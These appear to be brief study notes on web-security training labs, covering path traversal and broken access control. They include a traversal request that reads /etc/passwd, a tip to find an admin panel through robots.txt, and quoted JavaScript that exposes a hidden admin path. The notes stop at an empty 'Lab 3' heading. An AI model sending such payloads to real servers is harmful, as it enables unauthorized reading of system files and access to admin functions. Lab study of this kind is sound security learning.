## Path Traversal
### Lets you access any directory by using ../../../ to go back to home directory
### This can be dangerous if we can access some sensitive files such as /etc/passwd

### Lab Solution
```bash
GET /image?filename=../../../../../../../etc/passwd HTTP/2
```

## Access Control
### Vertical Privelage Escalation
### When a normal user gain access to functionality they are not allowed to access

## Lab 1 Solution
```bash
Look at /robots.txt u will find admin panel, browse to admin panel
```

## Lab 2 Solution
### After browsing through the source code we find an admin function that discloses admin directory
```javascript
var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-7ey9aw');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   var pTag = document.createElement('p');
   pTag.innerText = '|';
   topLinksTag.appendChild(pTag);
}

## Lab 3 Solution

